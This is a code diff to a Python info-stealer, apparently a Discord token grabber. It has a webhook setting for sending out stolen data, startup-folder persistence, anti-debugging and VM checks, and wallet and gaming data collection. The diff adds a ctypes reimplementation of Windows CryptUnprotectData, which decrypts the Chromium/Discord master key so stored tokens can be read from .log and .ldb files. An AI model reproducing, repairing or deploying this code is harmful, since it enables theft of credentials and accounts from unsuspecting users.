@@ -18,8 +18,9 @@ import winreg, random
 from base64 import b64decode
 import os.path, zipfile
 import shutil, json, sqlite3
-from win32crypt import CryptUnprotectData
 import tempfile, datetime
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+
 ### CONFIG ### 
 webhook = '%Webhook%' #Put your webhook
 
@@ -30,6 +31,7 @@ Startup = '%Startup%' # If True, adds the file to the startup folder
 antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
 DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
 StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
+
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"],
@@ -43,7 +45,6 @@ for modl in requirements:
     except ImportError:
         subprocess.call(['pip', 'install', modl[1]])
 
-from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 import win32clipboard
 import requests
@@ -212,15 +213,17 @@ def GetData(blob_out):
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
-def crunprot(encrypted_bytes, entropy=b''):
-    buffer_in = create_string_buffer(encrypted_bytes, len(encrypted_bytes))
-    buffer_entropy = create_string_buffer(entropy, len(entropy))
+
+def CryptUnprotectData(encrypted_bytes, entropy=b''):
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
     blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
     blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
     blob_out = DATA_BLOB()
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
+
 
 wltZip = []
 GamingZip = []
@@ -890,7 +893,7 @@ def GetDiscord(path, arg):
     pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = crunprot(master_key[5:])
+    master_key = CryptUnprotectData(master_key[5:])
     
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb")   :
